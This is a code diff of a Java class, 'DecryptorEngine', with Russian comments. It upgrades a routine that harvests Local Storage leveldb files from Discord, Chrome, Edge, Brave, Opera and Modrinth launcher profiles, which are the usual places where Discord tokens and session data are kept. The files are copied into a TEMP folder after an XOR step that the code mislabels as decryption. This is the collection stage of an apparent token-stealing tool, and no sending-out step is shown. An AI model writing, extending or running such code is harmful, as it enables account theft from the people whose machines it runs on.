@@ -2,10 +2,12 @@ import java.io.*;
 import java.nio.file.*;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
+import java.util.*;
 
 public class DecryptorEngine {
     private static final String TEMP_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
     private static final byte[] KEY = "SwillWay2025Key42".getBytes();
+    private static int fileCount = 0;
     
     private static void log(String msg) {
         String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
@@ -13,95 +15,99 @@ public class DecryptorEngine {
     }
     
     public static void main(String[] args) {
-        log("DecryptorEngine v2.0 started");
+        log("DecryptorEngine v3.0 started");
         new File(TEMP_DIR).mkdirs();
         log("Temp dir: " + TEMP_DIR);
         
-        // Ищем ВСЕ папки leveldb, а не только стандартные
-        scanAllDrivesForLevelDB();
+        // Очищаем старые файлы, чтобы не было дублей
+        cleanOldFiles();
         
-        log("Scan complete");
+        scanAndDecrypt();
+        
+        log("Scan complete. Total files decrypted: " + fileCount);
     }
     
-    private static void scanAllDrivesForLevelDB() {
-        // Стандартные пути
-        String[] defaultPaths = {
-            System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
-            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
-            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
-            System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
-            System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb"
-        };
-        
-        for (String path : defaultPaths) {
-            if (path != null) {
-                File dir = new File(path);
-                if (dir.exists()) {
-                    log("Found: " + path);
-                    copyFilesToTemp(dir);
-                } else {
-                    log("Not found: " + path);
+    private static void cleanOldFiles() {
+        File dir = new File(TEMP_DIR);
+        File[] files = dir.listFiles();
+        if (files != null) {
+            for (File f : files) {
+                if (f.isFile() && f.getName().endsWith(".dec")) {
+                    f.delete();
+                    log("Deleted old: " + f.getName());
                 }
             }
         }
-        
-        // Дополнительный поиск в AppData
-        searchInAppData();
     }
     
-    private static void searchInAppData() {
-        String appData = System.getenv("APPDATA");
-        String localAppData = System.getenv("LOCALAPPDATA");
+    private static void scanAndDecrypt() {
+        List<String> targetPaths = new ArrayList<>();
         
-        if (appData != null) {
-            File appDataDir = new File(appData);
-            searchDirectoryForLevelDB(appDataDir);
-        }
+        // Стандартные пути
+        targetPaths.add(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb");
+        targetPaths.add(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
+        targetPaths.add(System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");
+        targetPaths.add(System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb");
+        targetPaths.add(System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb");
+        targetPaths.add(System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
+        targetPaths.add(System.getenv("LOCALAPPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
+        targetPaths.add(System.getenv("USERPROFILE") + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb");
         
-        if (localAppData != null) {
-            File localAppDataDir = new File(localAppData);
-            searchDirectoryForLevelDB(localAppDataDir);
+        // Поиск в папках Modrinth и лаунчеров
+        String userHome = System.getProperty("user.home");
+        targetPaths.add(userHome + "\\AppData\\Roaming\\ModrinthApp\\profiles\\*\\discord\\Local Storage\\leveldb");
+        
+        for (String path : targetPaths) {
+            if (path == null) continue;
+            
+            // Поддержка wildcard
+            if (path.contains("*")) {
+                String basePath = path.substring(0, path.indexOf("*"));
+                File baseDir = new File(basePath);
+                if (baseDir.exists() && baseDir.isDirectory()) {
+                    File[] subDirs = baseDir.listFiles(File::isDirectory);
+                    if (subDirs != null) {
+                        for (File subDir : subDirs) {
+                            String newPath = path.replace("*", subDir.getName());
+                            processDirectory(newPath);
+                        }
+                    }
+                }
+            } else {
+                processDirectory(path);
+            }
         }
     }
     
-    private static void searchDirectoryForLevelDB(File dir) {
-        if (dir == null || !dir.exists()) return;
-        
-        try {
-            Files.walk(dir.toPath())
-                .filter(Files::isDirectory)
-                .filter(p -> p.toString().endsWith("leveldb"))
-                .limit(20) // Ограничиваем поиск для производительности
-                .forEach(p -> {
-                    log("Found leveldb in search: " + p.toString());
-                    copyFilesToTemp(p.toFile());
-                });
-        } catch (Exception e) {
-            log("Search error: " + e.getMessage());
-        }
-    }
-    
-    private static void copyFilesToTemp(File sourceDir) {
-        File[] files = sourceDir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
-        if (files == null || files.length == 0) {
-            log("No .log/.ldb files in " + sourceDir.getPath());
+    private static void processDirectory(String path) {
+        File dir = new File(path);
+        if (!dir.exists() || !dir.isDirectory()) {
             return;
         }
         
-        log("Copying " + files.length + " files from " + sourceDir.getPath());
+        log("Found: " + path);
+        File[] files = dir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
+        if (files == null || files.length == 0) {
+            log("No .log/.ldb files in " + path);
+            return;
+        }
         
         for (File f : files) {
             try {
                 byte[] data = Files.readAllBytes(f.toPath());
-                // Расшифровка XOR
+                // XOR расшифровка
                 for (int i = 0; i < data.length; i++) {
                     data[i] ^= KEY[i % KEY.length];
                 }
-                String outPath = TEMP_DIR + "\\" + sourceDir.getName() + "_" + f.getName() + ".dec";
+                
+                String outName = dir.getName() + "_" + f.getName() + ".dec";
+                String outPath = TEMP_DIR + "\\" + outName;
                 Files.write(Paths.get(outPath), data);
-                log("Decrypted and saved: " + outPath + " (" + data.length + " bytes)");
+                fileCount++;
+                log("Decrypted: " + f.getName() + " -> " + outName + " (" + data.length + " bytes)");
+                
             } catch (Exception e) {
-                log("Error processing " + f.getName() + ": " + e.getMessage());
+                log("Error decrypting " + f.getName() + ": " + e.getMessage());
             }
         }
     }
